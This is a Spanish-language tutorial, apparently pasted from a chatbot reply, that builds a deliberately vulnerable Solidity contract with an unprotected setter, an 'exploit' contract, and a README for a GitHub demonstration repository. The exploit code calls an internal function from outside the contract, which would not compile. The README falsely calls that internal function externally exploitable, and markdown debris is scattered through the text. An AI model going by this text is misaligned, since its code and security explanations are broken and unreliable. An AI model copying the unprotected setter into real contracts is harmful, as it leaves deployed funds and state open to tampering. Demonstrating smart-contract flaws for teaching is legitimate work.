# Vottunas1. Crear el Contrato Inteligente Vulnerable
solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableContract {
    // Esta variable es pública y se puede leer desde fuera del contrato
    uint256 public data;

    // Constructor que inicializa el contrato
    constructor() {
        data = 12345;
    }

    // Función vulnerable que permite modificar la variable `data`
    function updateData(uint256 _data) external {
        data = _data;
    }

    // Función interna vulnerable que puede ser invocada desde contratos derivados
    function internalFunction() internal view returns (uint256) {
        return data;
    }
}
2. Crear un Contrato que Explote la Vulnerabilidad
solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract ExploitContract {
    VulnerableContract public vulnerable;

    // Constructor que acepta la dirección del contrato vulnerable
    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    // Función que explota la vulnerabilidad del contrato vulnerable
    function exploitUpdateData(uint256 _data) public {
        // Cambiar el valor de la variable `data` en el contrato vulnerable
        vulnerable.updateData(_data);
    }

    // Función para explotar la función interna
    function exploitInternalFunction() public view returns (uint256) {
        return vulnerable.internalFunction();
    }
}
3. Crear un Repositorio en GitHub
Crear el repositorio en GitHub:

Ve a GitHub y crea un nuevo repositorio. Nómbralo, por ejemplo, vulnerable-smart-contract.
Subir los archivos:

Crea un archivo VulnerableContract.sol y copia el código del contrato vulnerable.
Crea un archivo ExploitContract.sol y copia el código del contrato que explota la vulnerabilidad.
Crea un archivo README.md para explicar cómo verificar la vulnerabilidad.
4. Crear el Archivo README.md
En el archivo README.md, describe cómo desplegar y verificar la vulnerabilidad. Aquí tienes un ejemplo de contenido:

markdown

# Vulnerable Smart Contract

Este repositorio contiene un contrato inteligente vulnerable en Solidity y un contrato que explota dicha vulnerabilidad.

## Descripción

El contrato `VulnerableContract` contiene una variable pública `data` que puede ser modificada a través de la función externa `updateData`. Además, el contrato contiene una función interna `internalFunction` que retorna el valor de `data`, pero es vulnerable a ser llamada desde contratos derivados.

El contrato `ExploitContract` es un contrato que explota estas vulnerabilidades permitiendo a un atacante cambiar el valor de `data` o acceder a la función interna.

## Comandos para Verificar la Vulnerabilidad

1. Clonar el repositorio:

```bash
git clone https://github.com/tuusuario/vulnerable-smart-contract.git
cd vulnerable-smart-contract
Desplegar los contratos en un entorno de desarrollo como Remix o Truffle.

Usar el contrato ExploitContract para modificar la variable data del contrato vulnerable:

solidity
Copiar código
// Supongamos que el contrato `ExploitContract` ya ha sido desplegado
ExploitContract.exploitUpdateData(99999);
Verificar que el valor de data en VulnerableContract ha sido cambiado:
solidity
Copiar código
VulnerableContract.data(); // Debería retornar 99999
Advertencia
Este ejemplo es solo para fines educativos y de demostración. No despliegues estos contratos en una red principal, ya que contienen vulnerabilidades graves.

yaml
Copiar código

### 5. Compartir el Repositorio

Finalmente, una vez que hayas subido los archivos al repositorio, comparte el enlace al repositorio de GitHub.

---

Este ejemplo demuestra cómo crear un contrato inteligente vulnerable y un contrato que explota esa vulnerabilidad. La documentación en el `README.md` proporciona las instrucciones necesarias para reproducir y entender la vulnerabilidad.
